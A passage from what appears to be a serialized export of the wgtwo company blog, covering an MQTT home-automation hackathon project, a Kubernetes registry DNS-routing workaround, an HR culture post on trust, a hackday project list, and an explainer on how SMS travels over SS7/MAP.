mosquitto_sub command in my terminal. It shows that I first called my Swedish number and hanging up before it was actually ringing.\\n\\n```json\\n{\\"event\\":{\\"metadata\\":{\\"sequence\\":\\"1\\",\\"ackInbox\\":\\"_INBOX.VMTx7rnS0i3qXpHfuS5t3b\\"},\\"timestamp\\":\\"2021-01-06T11:24:40Z\\",\\"serviceId\\":\\"wotel\\",\\"voiceEvent\\":{\\"callId\\":\\"0c056e2c-07f9-4c2b-b5ca-042f160af42f\\",\\"type\\":\\"CALL_INITIATED\\",\\"fromNumber\\":{\\"e164\\":\\"+4712345678\\"},\\"toNumber\\":{\\"e164\\":\\"+46123456789\\"},\\"owner\\":{\\"e164\\":\\"+46123456789\\"}}}}\\n{\\"event\\":{\\"metadata\\":{\\"sequence\\":\\"2\\",\\"ackInbox\\":\\"_INBOX.VMTx7rnS0i3qXpHfuS5t3b\\"},\\"timestamp\\":\\"2021-01-06T11:24:43Z\\",\\"serviceId\\":\\"wotel\\",\\"voiceEvent\\":{\\"callId\\":\\"0c056e2c-07f9-4c2b-b5ca-042f160af42f\\",\\"type\\":\\"CALL_ENDED\\",\\"fromNumber\\":{\\"e164\\":\\"+4712345678\\"},\\"toNumber\\":{\\"e164\\":\\"+46123456789\\"},\\"owner\\":{\\"e164\\":\\"+46123456789\\"}}}}\\n```\\n\\nIf you run any home automation or other hobby projects at home, chances are that you already have a MQTT broker running.\\nYou could then setup bridging to not worry about credentials and TLS when consuming your events.\\n\\n## Wrapping it all up\\nFor this project I chose to use Node-RED, as it allows for very quick and easy to show drag-and-drop integrations.\\n\\nTo control the lamp, we did add the module `node-red-contrib-tradfri` as described in the Node-RED [documentation](https://flows.nodered.org/node/node-red-contrib-tradfri).\\n\\nFirst we did add a `mqtt out` node configured to listen to the topic 46123456789/# with output as a parsed JSON object using the credentials we got on login.\\n\\n![](/img/blog/mqtt-event-bridge/nodered-debug.png)\\n\\nWe then simply hooked its output to a debug node. Looking at the output, we can see that the event object has a key `voiceEvent`, as this is a voice event.\\n\\n![](/img/blog/mqtt-event-bridge/nodered-flow.png)\\n\\nThen we added a switch for handling it as a voice event if the voiceEvent key exists. Likewise, we added a new switch on the type field of that event.\\n\\nEach of those functions simply set the Tr\xe5dfri payload, as shown below:\\n\\n```json\\n{\\"state\\":\\"on\\",\\"color\\":\\"cool daylight\\"}\\n```\\n\\nAs this was created quickly as a hackathon project, the intention was never to actually make anything useful. Using this quick flow, it is however clear that it could be very useful for when my wife tries to call me, but I am programming equipped with my noise-cancelling headphones."},{"id":"forbidden-lore-hacking-dns-routing-for-k8s","metadata":{"permalink":"/blog/forbidden-lore-hacking-dns-routing-for-k8s","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-12-11-forbidden-lore-hacking-dns-routing-for-k8s.md","source":"@site/../blog/2020-12-11-forbidden-lore-hacking-dns-routing-for-k8s.md","title":"Forbidden lore: hacking DNS routing for k8s","description":"At WG2 we\u2019re coming close to having everything running in Kubernetes, which means that almost everything we deploy needs to be pulled from a registry. We have run our own local registry for some time now, to host both locally-built images and cached images from Docker Hub.","date":"2020-12-11T00:00:00.000Z","formattedDate":"December 11, 2020","tags":[{"label":"dns","permalink":"/blog/tags/dns"},{"label":"nginx","permalink":"/blog/tags/nginx"},{"label":"kubernetes","permalink":"/blog/tags/kubernetes"},{"label":"infrastructure","permalink":"/blog/tags/infrastructure"}],"readingTime":7.505,"hasTruncateMarker":true,"authors":[{"name":"Anna Kennedy","title":"Tech Lead for Cloud and Edge Infrastructure","url":"https://www.linkedin.com/in/annaken","imageURL":"/img/author-photos/ak.jpg","key":"anna-kennedy"},{"name":"Holger Ihrig","title":"Software Engineer for Session Management & Protocol Termination","url":"https://www.linkedin.com/in/hihrig/","imageURL":"/img/author-photos/hi.jpg","key":"holger-ihrig"},{"name":"Matt Long","title":"Engineering Manager for Edge, Cloud and Security","url":"https://www.linkedin.com/in/mattlong/","imageURL":"/img/author-photos/mtl-li.jpg","key":"mtl"},{"name":"Yan Grunenberger","title":"Software Engineer for Session Management & Protocol Termination","url":"https://www.linkedin.com/in/yangrunenberger/","imageURL":"/img/author-photos/yg.jpg","key":"yan"}],"frontMatter":{"slug":"forbidden-lore-hacking-dns-routing-for-k8s","title":"Forbidden lore: hacking DNS routing for k8s","date":"2020-12-11T00:00:00.000Z","tags":["dns","nginx","kubernetes","infrastructure"],"authors":["anna-kennedy","holger-ihrig","mtl","yan"]},"prevItem":{"title":"Changing the color of your bulbs: The fancy way","permalink":"/blog/mqtt-event-bridge"},"nextItem":{"title":"We\'re all grownups here","permalink":"/blog/were-all-grownups-here"}},"content":"At WG2 we\u2019re coming close to having everything running in Kubernetes, which means that almost everything we deploy needs to be pulled from a registry. We have run our own local registry for some time now, to host both locally-built images and cached images from Docker Hub.\\n\\n\x3c!--truncate--\x3e\\n\\nWe recently decided to improve the registry solution by implementing [Harbor](https://goharbor.io/) to scan images for vulnerabilities on upload, and replicating the registry into each of our multiple environments and regions. This would both eliminate Harbor as a single point of failure, and allow each cluster to pull images locally to minimise data transfer costs through the NAT gateway.\\n\\nThe overall workflow would look something like:\\n\\n* images are built and uploaded to Harbor\\n* Harbor scans for vulnerabilities and pushes images to a private registry\\n* this registry is replicated to a read-only registry\\n* the read-only registry is replicated to all environments and regions\\n* the Kubernetes cluster in each environment deploys from the local read-only registry\\n\\n![Workflow](/img/blog/forbidden-lore-hacking-dns-routing-for-k8s/multiregion.jpg)\\n\\nHarbor has to live somewhere, so we decided it should live in the dev environment, close to the CI system that builds the majority of our images. However, container image names contain the registry location that they are pulled from / pushed to, eg `reg.wgtwo.com/infra/logstash`. Therefore in the dev environment we have to find a way to deal with the fact that we want users and the CI system to push to Harbor, but we also want Kubernetes to pull images from the read-only registry.\\n\\nSo the main problem becomes: if the image name includes the url `reg.wgtwo.com`, how to make that point to two different places depending on usage?\\n\\n# Solution 1: DNS\\n\\nIn non-dev environments, the obvious solution is to redirect `reg.wgtwo.com -> read-only-registry` in Kubernetes CoreDNS. But in dev, we need different services to go to different places. The DNS model thus needs to look like:\\n\\n![DNS](/img/blog/forbidden-lore-hacking-dns-routing-for-k8s/dnsresolution.jpg)\\n\\nIn other words,\\n\\n* ``Route53`` sets `reg.wgtwo.com -> harbor`\\n* K8s coreDNS sets `reg.wgtwo.com -> read-only-registry`\\n* CI (Concourse) bypasses cluster lookup and goes to ``Route53`` instead, such that `reg.wgtwo.com -> harbor`\\n\\nWe initially deployed a DNS sidecar to the CI system, but with multiple Concourse pods we got multiple sidecars and we really only needed one, plus we had to manipulate Concourse\u2019s internal DNS cache (`CONCOURSE_GARDEN_DNS_SERVER`) but that broke DNS between Concourse and everything else in the cluster. Replacing the sidecar with a DNS pod in the CI namespace worked better, although then all the CI jobs needed to be updated to use that new pod as their nameserver.\\n\\n![Sleight of hand](/img/blog/forbidden-lore-hacking-dns-routing-for-k8s/sleight-of-hand.gif)\\n\\nHowever at this point we realised that although we want to deploy pods into Kubernetes, the process that does the deploying lives on the Kubernetes nodes, outside of cluster scope.\\nWe don\u2019t do any config management on the nodes, we just let [kOps](https://github.com/kubernetes/kops) deploy everything that Kubernetes needs for a cluster, so we were reluctant to introduce an entirely different system just for managing one `resolv.conf` file. Also the concentric DNS setup would have a very wide scope and be somewhat difficult to debug. Maybe this was a problem better resolved using some clever nginx routing?\\n\\n# Solution 2: nginx\\n\\nIf we could find some way of differentiating the Harbor traffic from read-only-registry traffic, we could let nginx route requests to the right place.\\n<iframe src=\\"https://giphy.com/embed/QaPkV29BJh3gI\\" width=\\"240\\" height=\\"177\\" frameBorder=\\"0\\" class=\\"giphy-embed\\" allowFullScreen></iframe>\\n\\n\\n# Solution 2a: nginx routes traffic on IP\\n\\n* Traffic from the outside world plus traffic from Concourse needs to go to Harbor.\\n* Traffic from the Kubernetes cluster needs to go to the read-only-registry.\\n\\nThe [nginx geo module](https://nginx.org/en/docs/http/ngx_http_geo_module.html) sounded like a good idea, where we could set our internal subnet ranges to go to the read-only-registry. However getting the ingress annotations to put this config in the right place turned out to be challenging, since it needs to go outside of both `http snippet` and `server snippet` blocks. But before we dug further into this issue we realised that all of the traffic to nginx would arrive via the internet gateway, meaning we wouldn\u2019t see source IP anyway.\\n\\n# Solution 2b: nginx routes on custom header\\n\\nThe new `canary` feature in nginx makes this kind of routing very easy - traffic that matches a certain criteria gets sent to a different backend. We could use a custom header such as `ro-reg` to send internal traffic to the read-only registry.\\n\\n    annotations:\\n      nginx.ingress.kubernetes.io/canary: \\"true\\"\\n      nginx.ingress.kubernetes.io/canary-by-header: \\"ro-reg\\"\\n\\nThe docker (client) config has an [HttpHeaders](https://github.com/docker/cli/blob/master/man/docker-config-json.5.md) section, so it would be easy enough to add this section to all of our image-pull secrets, meaning all internal pulls - but nothing else - should go to the read-only registry.\\n\\nWe had to rearrange things a little in order to terminate SSL on nginx and not at the registry so that nginx would be able to read the headers, but that was straightforward.\\n\\nIn our initial tests from the laptop, this worked great. However it quickly transpired that this was the only place it worked from. Where we needed it to work from - the Kubernetes nodes - didn\u2019t run Docker, they run ``docker-shim`` on top of ``containerd``, and ``HttpHeaders`` [are not implemented yet](https://github.com/containerd/cri/issues/1400). Back to the drawing board.\\n\\n# Solution 2c: nginx routes on auth header\\n\\nGetting nervous that we\u2019d used a week to get nothing working, we started clutching at some very hacky straws. Even if docker-shim doesn\u2019t send custom headers, we could see it sending auth headers, and we have different login details for Harbor versus the read-only registry. We wondered if we could route on the auth hash, postponing entirely the discussion about whether we should do such a horrible thing, or the security implications of having the auth hash in a plaintext nginx config.\\n<iframe src=\\"https://giphy.com/embed/I8RMi1UY8cEKs\\"  frameBorder=\\"20px\\" class=\\"giphy-embed\\" allowFullScreen></iframe>\\n\\n\\nWe soon discovered that this solution was also never going to work. In Kubernetes, it is the ``kubelet`` process that does the image pull at the start of a pod deployment, and after some wiresharking it turns out that the very first thing kubelet does is make an unauthenticated call to the `registry/v2` endpoint to fetch metadata which it then uses to begin authentication.\\n\\nThis is expected behaviour for a docker registry, [according to documentation](https://docs.docker.com/registry/spec/auth/token/), but with nginx routing on auth header, it meant that the initial call was routed to Harbor which sent back an auth URL also for Harbor, and thus kubelet never even arrived at the read-only registry, let alone managed to authenticate.\\n\\n# Aside: other issues with headers\\n\\nDuring this debugging session we also realised that we\u2019d been creating image-pull secrets in Kubernetes with both `.dockercfg` and `.dockerconfigjson`, not realising that `.dockercfg` [is the old format](https://github.com/moby/moby/pull/12009) and that `.dockercfg` likely does not support HttpHeaders at all.\\n\\nKubelet [does support HttpHeaders](https://github.com/Kubernetes/Kubernetes/blob/e1fd2d7ff57af153023347d72d17226effd917c8/pkg/credentialprovider/config.go#L44), but relies on the underlying container runtime to also support them - which is not the case for containerd.\\n\\nAdditionally, when creating a Kubernetes secret containing `.dockerconfigjson`, it appears that it is very important that there is no whitespace in the secret, or authentication will fail.\\n\\n# Solution 2d: route on some other inherent header\\n\\nAs one final attempt at making nginx routing work, we looked for other headers being sent, but there was no single header that let us differentiate between kubelet, laptop, and Concourse.\\n\\nKubelet sends a useragent of either `docker` or `go-http-agent` (depending on whether the call is the initial one or a retrial) and filtering on `go-http-agent` also catches Concourse requests, rendering it useless for this task. We were also worried it might end up catching all sorts of unintended cases since we have quite a lot of `go`-based applications in our ecosystem.\\n\\nWe took a moment to mourn the loss of our nginx idea, and went back to a DNS solution.\\n\\n![Mourn](/img/blog/forbidden-lore-hacking-dns-routing-for-k8s/pulpfiction.jpg)\\n\\n# Solution 3: DNS, again\\n\\nWe put the DNS solution back in place again, where\\n\\n* ``Route53`` sets `reg.wgtwo.com -> harbor`\\n* K8s nodes set `reg.wgtwo.com -> read-only-registry`\\n* K8s coreDNS sets `reg.wgtwo.com -> read-only-registry`\\n* CI runs an additional coreDNS pod setting `reg.wgtwo.com -> harbor`\\n* Concourse uses CI coreDNS pod to set `reg.wgtwo.com -> harbor`\\n\\nWhich brought us back to the problem that was still there: how to update `/etc/resolv.conf` on the nodes. In the continued absence of config management, we hit upon the wonderful hack of using a privileged pod daemonset to manage the config for us via systemd.\\n\\nThe privileged pod on each node would write a new config file to `/etc/systemd/resolvd.conf`, and then restart the systemd service to update the running resolvd process.\\n\\nThis would thus control configuration on the Kubernetes node from inside of Kubernetes, which is admittedly morally wrong but also works really well. It also keeps the configuration alongside all the rest of our configuration instead of hidden away somewhere new.\\n\\n![wheel change](/img/blog/forbidden-lore-hacking-dns-routing-for-k8s/wheelchange.gif)\\n\\nA future solution might be to implement some kind of local DNS server/cache on each node, but for now we\u2019ll settle for a working system and a huge increase in knowledge about the inner workings of many of our components."},{"id":"were-all-grownups-here","metadata":{"permalink":"/blog/were-all-grownups-here","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-11-20-were-all-grownups-here.md","source":"@site/../blog/2020-11-20-were-all-grownups-here.md","title":"We\'re all grownups here","description":"I have always struggled with company HR policies that make me not feel trusted. Why don\u2019t HR and/or management trust who they hire? Why create HR processes for the very few people who don\u2019t behave? Shouldn\u2019t processes be designed for the vast majority of people who are to be trusted? I just don\u2019t get it. If you are given freedom it comes with a lot of responsibility, isn\u2019t that rather implicit?","date":"2020-11-20T00:00:00.000Z","formattedDate":"November 20, 2020","tags":[{"label":"trust","permalink":"/blog/tags/trust"},{"label":"culture","permalink":"/blog/tags/culture"},{"label":"startup","permalink":"/blog/tags/startup"}],"readingTime":5.915,"hasTruncateMarker":true,"authors":[{"name":"Victoria Hicks M\xf8rkved","title":"Head of People","url":"https://www.linkedin.com/in/victoriamorkved/","imageURL":"/img/author-photos/vhm.jpg","key":"victoria-hicks"}],"frontMatter":{"slug":"were-all-grownups-here","title":"We\'re all grownups here","date":"2020-11-20T00:00:00.000Z","tags":["trust","culture","startup"],"authors":"victoria-hicks"},"prevItem":{"title":"Forbidden lore: hacking DNS routing for k8s","permalink":"/blog/forbidden-lore-hacking-dns-routing-for-k8s"},"nextItem":{"title":"October Virtual Hackdays","permalink":"/blog/hackdays-october-2020"}},"content":"I have always struggled with company HR policies that make me not feel trusted. Why don\u2019t HR and/or management trust who they hire? Why create HR processes for the very few people who don\u2019t behave? Shouldn\u2019t processes be designed for the vast majority of people who are to be trusted? I just don\u2019t get it. If you are given freedom it comes with a lot of responsibility, isn\u2019t that rather implicit?\\n\\n\x3c!--truncate--\x3e\\n\\nIt comes down to a choice - minimize risk by implementing all possible controls, or trust people and implement necessary controls only. We believe the latter drives ownership, motivation and a better product and company. That doesn\u2019t mean it is easy though - the need to control is a fundamental human need, and we need daily reminders to always push in the opposite direction.\\n\\nWhen I was in discussions with Erlend (our CEO) about joining **wgtwo**, the term \u201cstartup for grownups\u201d was used and I remember thinking \u201chuh, that makes sense\u201d. Now, 2 years in, the simple fact that yes we are all grownups here and we all deserve to be treated as such has become an embedded part of our company culture.\\n\\nI wanted to give you some tangible examples of how we do things. For context, we are a startup tech company with a team of ~50 (87% engineers). We have offices in Oslo, Trondheim, Stockholm, a hub in Germany and remote team members in Japan, Spain, the U.S., Canada, London and Myanmar.\\n\\n## What approvals?\\n\\nWe try to minimize that amount of approvals necessary to a minimum. Here is how we communicate that to new hires in some of the areas companies typically have approvals\\n* Vacation: Yes, we do have the standard 25 days of vacation (standard in the Nordics) in our contracts. But, we also trust you to know yourself best, and understand that no year or situation is the same. Sometimes you might need more, sometimes less. As long as it works for your team, we trust you to make a judgement. We also trust that you take enough time off as we all need time off to reset and recharge.\\n* Expenses: We trust your judgement and that you wouldn\u2019t be making the purchase if it wasn\u2019t necessary for you and the team. This applies when deciding on which equipment (i.e. laptop, monitor, keyboard, phone etc) you need when you start and later if there is something you need. I have yet to experience anyone asking for anything totally unreasonable. Of course you are welcome to reach out if you are unsure and from time to time we might have discussions, but surprisingly seldom to be honest.\\n* Travel: We encourage you to travel between offices to build a strong relationship with the whole team (unfortunately not now of course with the covid-19 going on). You do not need approval to book travel, and remember you don\u2019t need a \u201creason\u201d to go.\\n* Working hours: As long as you do a good job we don\u2019t care if you work half days Mondays or start working at lunch time and into the evening, go to the gym and so on. Up to you, as long as it works for your team. Not to mention where you work from. Office, home, cabin, boat - who cares as long as you are connected right?\\n\\nThese aren\u2019t necessarily big things in everyday life, but they take out administrative hassle, and it aligns with the messaging of that we try to trust each other.\\n\\n## Are you a role model?\\n\\nThis lack of approvals does create another need though - the need for role models. So we do remind the team to keep in mind that we are role models for each other. It provides alignment. Whether it\u2019s sharing with the others that the train ticket prices are currently low and recommend people to book now to save money, or taking initiative to set up a virtual social Friday get-together to end the week together. We even have our own role model emoji in slack, which we sometimes remember to use and I do believe people feel proud if they get one.\\n![Decorative illustration](/img/blog/were-all-grownups-here/04.png)\\n\\n## Sharing is caring\\n\\nThat we see each other as grownups is also evident in how we communicate and what information we trust each other with. If there is one thing the team mentions to me that has surprised them the most after joining, it is the amount of information that is shared across the team about sales, customer meetings and other business processes. The good and the bad. When I had a \u201c6 months in\u201d check-in with one of our newest team members he emphasized exactly this and explained how this made him feel involved and prepared for what was coming. It is also evident when people choose to share that they are struggling with the likes of depression or something else often considered very private. Or just putting up your hand and saying \u201cI broke something\u201d and taking responsibility for that. I believe this level of sharing is possible because we trust each other and have each other\'s backs and management leads the way when it comes to sharing.\\n\\n## Direction\\n\\nTo clarify. We do of course need to make sure we move the company in the right direction together. We have chosen to use OKRs (Objectives and Key Results) as a tool for that. A tool that helps us discuss and decide together as a team what we want to achieve, but without dictating the how. This is a delicate balance, and we always have to fight to not create too detailed OKRs. The teams and individuals should feel empowered when understanding and agreeing on the why and what, but are allowed to determine the how.\\n![Decorative illustration](/img/blog/were-all-grownups-here/03.png)\\n\\n## Stay open to change\\n\\nSo do we have improvement areas? Of course! One example is that I believe we can be better at living one of our values which is \u201cTough Love\u201d. This relates to among other things how we give feedback. I wouldn\u2019t say we are bad at it, but our inclination is often towards being a bit too soft, which sometimes leads to unclear feedback or neglecting giving feedback. So we need to keep practicing to make sure we challenge and develop each other as much as we can. And I\u2019m sure it\u2019s a bunch of other stuff. We are still a young company and open to change - we try out stuff and sometimes fail. We keep on learning and making small tweaks all the time to adjust to our team. Just this morning I listened to an inspiring 5 min talk from Lucy Adams about probation periods and realized that we have those in our contracts -  yikes that doesn\u2019t exactly scream that we trust who we recruit does it? I will look into that asap\u2026\\n\\nSo, we are all grownups here. At least most of the time. Although maybe not when the Trondheim team bought naughty chocolates and expensed it to see if anyone would notice (we didn\u2019t)."},{"id":"hackdays-october-2020","metadata":{"permalink":"/blog/hackdays-october-2020","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-10-28-hackdays.md","source":"@site/../blog/2020-10-28-hackdays.md","title":"October Virtual Hackdays","description":"this week we started off with a three days hackathon!","date":"2020-10-28T00:00:00.000Z","formattedDate":"October 28, 2020","tags":[{"label":"hackathon","permalink":"/blog/tags/hackathon"}],"readingTime":1.705,"hasTruncateMarker":true,"authors":[{"name":"Everyone @ wgtwo","title":"\ud83c\udf55","url":"https://www.wgtwo.com","imageURL":"/img/author-photos/wgtwo.png","key":"wgtwo"}],"frontMatter":{"slug":"hackdays-october-2020","title":"October Virtual Hackdays","date":"2020-10-28T00:00:00.000Z","tags":["hackathon"],"authors":"wgtwo","image":"/img/blog/hackdays-october-2020/presentations.png"},"prevItem":{"title":"We\'re all grownups here","permalink":"/blog/were-all-grownups-here"},"nextItem":{"title":"What the heck is a short message?","permalink":"/blog/what-is-a-short-message"}},"content":"this week we started off with a three days hackathon!\\n\\nEvery quarter **wgtwo** holds a three day hackday. Hackdays are a great way for everyone in the company to work together in creating new innovative solutions for every day problems.\\n\\n\x3c!--truncate--\x3e\\n\\nThis time, we had the joy of having a three day remote hackday that included 10+ teams and yes - *pizza*.\\n\\n<img class=\\"image\\"\\n    src=\\"/img/blog/hackdays-october-2020/presentations.png\\"\\n    alt=\\"Most of us\\" />\\n\\n# Hackday Presentations\\n\\n## Grafana Annotations\\n\\n*Team: Jonny, Per, Victoria*\\n\\nAdd git commit and other tags (i.e. pagerduty alerts) as annotations in Grafana.\\n\\n## Tokens to the people\\n\\n*Team: H\xe5kon*\\n\\nEasy access to create new developer tokens to our APIs.\\n\\n## It\'s broken (or malware)\\n\\n*Team: Holger, Noy*\\n\\nSetup pies to be able to automate testing.\\n\\n## Java 11 Toolchain\\n\\n*Team: Stein Eldar*\\n\\nUpgrade of Java toolchain in Bazel!\\n\\n## Random bazel facts\\n\\n*Team: Konstantin*\\n\\nGood to have configurations for Bazel caching.\\n\\n## GTP-C tracing on PGW\\n\\n*Team: Pavel*\\n\\nInvestigate and experiment how to upload PCAP traces from PGW in S3.\\n\\n## mtr-packet-exporter\\n\\n*Team: Bj\xf8rn*\\n\\nExport routing hops and latency metrics to prometheus.\\n\\n## Kafka voice - kava\\n\\n*Team: Sergey*\\n\\nKafka instead of Firebreeze as a backend for Voice.\\n\\n## Parental Control on PGW\\n\\n*Team: Etienne / Nicholas*\\n\\nDynamic subscriber-based APN configurations for parental control DNS.\\n\\n## text rules\\n\\n*Team: J\xf8rund*\\n\\nMigrating SMS forwarding into a separate app under **wgtwo** developer platform.\\n\\n## Distributed tracing\\n\\n*Team: Karl Johan/William*\\n\\nJaeger tracing to be able to follow time spent in different components.\\n\\n## 3 ideas to attract/hire engineers\\n\\n*Team: Ana/Jessica*\\n\\nAdvent of code, showing engineering day-to-day work, image/video snippets.\\n\\n## MQTT for events\\n\\n*Team: GI*\\n\\nHome automation with MQTT server as an app.\\n\\n## David sucks at load testing (loomylin)\\n\\n*Team: David*\\n\\nUtilize project Loom to get lightweight virtual threads in JVM.\\n\\n## AWS Transit Gateway\\n\\n*Team: Erhan*\\n\\nMaintaining routes and connecting subnets between VPCs with a transit gateway.\\n\\n## PCAP traces as JSON\\n\\n*Team: Masse*\\n\\nTranslate pcaps to a readable format and upload it to Athena.\\n\\n<img class=\\"image\\"\\n    src=\\"/img/blog/hackdays-october-2020/hackday.jpeg\\"\\n    alt=\\"hackday logo stickers\\" />"},{"id":"what-is-a-short-message","metadata":{"permalink":"/blog/what-is-a-short-message","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-10-01-what-is-short-messages.md","source":"@site/../blog/2020-10-01-what-is-short-messages.md","title":"What the heck is a short message?","description":"I will try as best as I can to give an explanation of what happens","date":"2020-10-01T00:00:00.000Z","formattedDate":"October 1, 2020","tags":[{"label":"telco","permalink":"/blog/tags/telco"},{"label":"MAP","permalink":"/blog/tags/map"},{"label":"TCAP","permalink":"/blog/tags/tcap"},{"label":"SS7","permalink":"/blog/tags/ss-7"},{"label":"Forward-SM","permalink":"/blog/tags/forward-sm"},{"label":"SMS","permalink":"/blog/tags/sms"}],"readingTime":13.255,"hasTruncateMarker":true,"authors":[{"name":"Sebastian Weddmark Olsson","title":"Tech Lead for Session Management & Protocol Termination","url":"https://www.linkedin.com/in/sebastian-weddmark-olsson/","imageURL":"/img/author-photos/swo.jpg","key":"seba"}],"frontMatter":{"slug":"what-is-a-short-message","title":"What the heck is a short message?","date":"2020-10-01T00:00:00.000Z","tags":["telco","MAP","TCAP","SS7","Forward-SM","SMS"],"authors":"seba"},"prevItem":{"title":"October Virtual Hackdays","permalink":"/blog/hackdays-october-2020"},"nextItem":{"title":"A new hope for products in telecom","permalink":"/blog/a-new-hope-for-products-in-telecom"}},"content":"I will try as best as I can to give an explanation of what happens\\nwhen you send an SMS from your phone.\\n\\nDisclaimer: Telco stuff is hard.\\n\\nAlso disclaimer: this blog post will also contain alot of ackronyms,\\nafter all, it is telco.\\n\\n_Aaand down the rabbit hole we go..._\\n\\n\x3c!--truncate--\x3e\\n\\n# Where to even start\\n\\nIn the *SS7* (telco/telecom/telecommunications) network there are many\\ndifferent nodes (servers), with different kinds of tasks.\\n\\nThe group of protocols that is used to send signals over *IP* between\\nthese nodes is called *SIGTRAN* (derived from \\"signaling transport\\").\\nOlder networks that have not switched to *IP* do not use *SIGTRAN*.\\n\\n*SIGTRAN* protocols are the lower layer protocols used for signaling,\\nthey range from *SCTP* (Stream Control Transmission Protocol) to\\n*M2PA* (Message Transfer Part 2 User Peer-to-Peer Adaptation Layer)\\nand *M3UA* (Message Transfer Part 3 User Adaptation Layer).\\n\\n*SCTP* is like a mix between *UDP* and *TCP*. It is supposed to be\\nquicker than *TCP*, but more reliable than *UDP*.\\n\\nBoth *M2PA* and *M3UA* support *SCTP* management, and the reporting of\\nstatus changes of those, as well as providing transfer of *MTP3*\\n(Message Transfer Part 3) messages.\\n\\nOn top of *SIGTRAN* are the *SS7* protocols.\\n\\nWhat I\'m going to talk about are the protocols on the very top of *SS7*,\\nspecifically the *MAP* (Mobile Application Part) as well as the *TCAP*\\n(Transaction Capabilities Application Part). There are other protocols\\ninbetween, for instance *SCCP* (Signalling Connection Control Part)\\nwhich handles some handshaking, routing, and resilience.\\n\\nThe *MAP* layer is used when talking to some of the telco nodes such\\nas *HLR* (Home location registry), *VLR* (Visitor location registry),\\n*MSC* (Mobile switching centre), *SGSN* (Serving *GPRS* [ackronym in\\nackronyms; go telco!] support node) and the *SMSC* (Short message\\nservice centre).\\n\\n# MAP versions and TCAP dialogues\\n\\nThere are some iterations of *MAP* (v1, v2, v3, and v4) and messages\\nalmost always come in pairs, an acknowledgement (`ReturnResult` or\\n`ReturnError`) for each sent message (`Invoke`).\\n\\nTo determine which version to use between two nodes, the sending node\\ntries to start the transaction (called a dialogue) by sending a *TCAP*\\n`Begin` message with the *MAP* message and it\'s highest compatible\\nversion. If the receiving node cannot talk that version, it sends a\\n*TCAP* `Abort` message with it\'s highest compatible version. In v1\\nthere might not even be a reason, just an empty `Abort`; the sending\\nnode might then try to send the *MAP* message as v1 anyway.\\n\\nIn my head it goes like this:\\n\\n```\\nNode 1: \\"Hi, I want to talk version 3 to you about this\\"\\nNode 2: \\"No I don\'t understand you, but we can talk version 2 about it instead\\"\\nNode 1: \\"Ok, then I want to talk version 2 to you about this instead\\"\\nNode 2: \\"Aah, now I see...\\"\\n```\\n\\nOr maybe\\n\\n```\\nNode 1: \\"Hi, I want to talk version 3 to you about this\\"\\nNode 2: \\"No\\"\\nNode 1: \\"Ok, then I want to talk to you about this in version 1 instead\\"\\nNode 2: \\"Maybe I will talk to you, maybe I will not\\"\\n```\\n\\nFor *TCAP* dialogues there are (mainly) four message types.  `Begin`,\\n`Continue`, `End`, `Abort`. Each of the types have an ID (or two, as I\\nsaid, telco is complicated), a component and a dialogue part. The\\ncomponent contains the *MAP* message. The dialogue part contains\\nthe version and application to use (that is *MAP* Application;\\ni.e. which type of message it contains), but it is only used in the\\nfirst message from both nodes for the version negotiation.\\n\\n_I think this covers most of it, let\'s get back to the fun part._\\n\\n# How does SMS work?\\n\\n*SMS* was initally implemented because of the wish to send text\\nmessages to pagers using the phoneline when it was not in use for\\nphonecalls. It was decided at a meeting in Oslo to be released to the\\npublic when some French and German company understood it\'s\\nvalue. (Don\'t quote me on any of this).\\n\\nWhen you send an *SMS*, the *SMS* is transfered to the *MSC* or the\\n*SGSN* in your current (serving) network. The *MSC* or *SGSN* then\\nsends an packet called `MO-Forward-SM` towards the *SMSC* in your\\ncurrent network. It stands for \\"Mobile Originating Forward Short\\nMessage\\" meaning it started from your (mobile-)phone.\\n\\nThe *SMSC* then asks the recipients HLR about the routing details for\\nthe *SMS*. It does so by sending another *MAP* message of type\\n`sendRoutingInfoForSM` requesting the location of the recipients *MSC*\\nor *SGSN*, or both.\\n\\nThe *SMSC* then sends another packet, this time a `MT-Forward-SM`,\\ntowards the *MSC* in the recipients network. In this case *MT* stands\\nfor Mobile Terminated, meaning it goes towards the recipients phone.\\n\\n_Dia have amazing icons:_\\n<div>\\n    <img src=\\"/img/blog/sms/forward-sm.svg\\" alt=\\"You calling your mom\\" />\\n</div>\\n\\nThe similarities in *MO* and *MT* requests are that they both contain\\na origin and destination address as well as the user data (your actual\\ntext message), and a possibly a correlation id which is basically a\\nmapping between your SIM-card id and a temporary id and was originally\\nused for making sure that the sending network paid for *SMS*s towards\\nthe receiving network.\\n\\nFor *MO* the origin address is your *MSISDN* (read telephone number),\\nand the destination is the *GT* address (Global title; a way to route\\nstuff) of the *SMSC*. For *MT* messages the origin address is the *GT*\\nof the *SMSC* and the destination address is either the recipients\\n*IMSI* (read SIM-card) or the recipients correlation id. It could also\\nbe a *LMSI* which is a 4-byte network location identifier if the\\nrecipient is also within the same network as the sender.\\n\\n## Ever wondered why there is a limit to the size of the text message you are sending?\\n\\n<div class=\\"left-right-row\\">\\n    <div class=\\"text\\">Two characters left on a GSM7 encoded SMS.</div>\\n    <img class=\\"image\\" src=\\"/img/blog/sms/160_chars.png\\" alt=\\"Characters left: 2/160\\" />\\n</div>\\n\\nIf you (god forbid) you would break the protocol and send a text\\nmessage greater than 140 bytes, which translates to 160, 152, or 70\\ncharacters depending on locale [1], then your phone would break up the\\nmessage into multiple text messages. This arbitrary size of 140 bytes\\nis not really arbitrary at all. It was chosen because it would\\nprecisely fit into a single *MTP3* *SIF* (Signalling Information\\nField) when routing label, *SCCP*, *TCAP* and *MAP* layers were taken\\ninto account.\\n\\n[1] There is something called *GSM7* bit-packing. Instead of using 1\\nbyte (8 bits) per character, *GSM7* uses 7 bits. This means that\\ninstead of 140 characters, you can get up to 160 characters per\\n*SMS*. The drawback is that you will have a smaller subset of\\ncharacters to use, only the most common is supported. If you include\\nany non-*GSM7* characters in your *SMS* then the *SMS* will\\nautomatically be converted to use either *USC-2* or *GSM7* with a\\ndifferent charset instead. *USC-2* uses 2 bytes, or 16 bits, instead\\nof *GSM7*s 7 bits. That leaves you with 70 characters per\\n*SMS*. *USC-2* is similar for the basic multilingual plane (*BMP*) to\\n*UTF-16*. In fact *UTF-16* is an extension of *UCS-2*. The main\\ndifference is 